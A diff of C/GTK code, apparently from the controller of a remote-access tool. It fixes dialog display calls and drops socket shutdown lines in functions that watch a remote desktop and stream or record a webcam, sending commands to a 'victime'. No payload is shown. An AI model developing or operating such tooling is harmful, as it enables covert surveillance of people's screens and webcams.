@@ -68,7 +68,7 @@ void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);
 
 
-    gtk_widget_show_all(GTK_DIALOG(IP_dialog));
+    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
     {
     case GTK_RESPONSE_APPLY:
@@ -216,7 +216,7 @@ void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);
 
 
-    gtk_widget_show_all(GTK_DIALOG(IP_dialog));
+    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
     {
     case GTK_RESPONSE_APPLY:
@@ -287,7 +287,7 @@ void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
         webcam_not_activated = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "Webcam is not activated !\nPlease execute the script: activate_the_webcam.sh\n\nCommand : bash activate_the_webcam.sh");
         gtk_widget_set_size_request(webcam_not_activated, 370, 120);
 
-        gtk_widget_show_all(GTK_DIALOG(webcam_not_activated));
+        gtk_widget_show_all(GTK_DIALOG(webcam_not_activated)->vbox);
         gtk_dialog_run(GTK_DIALOG(webcam_not_activated));
         gtk_widget_destroy(webcam_not_activated);
 
@@ -327,8 +327,6 @@ void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
     pclose(pipe);
 
     free(final_victime_cmd);
-
-    shutdown(sock, SHUT_RDWR);
 
     /* unused parameters */
     (void)button;
@@ -380,7 +378,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), frames_entry, TRUE, FALSE, 0);
 
 
-    gtk_widget_show_all(GTK_DIALOG(number_frames_dialog));
+    gtk_widget_show_all(GTK_DIALOG(number_frames_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(number_frames_dialog)))
     {
         case GTK_RESPONSE_OK:
@@ -465,8 +463,6 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     }
 
     free(final_victime_cmd);
-
-    shutdown(sock, SHUT_RDWR);
 
     /* unused parameters */
     (void)button;
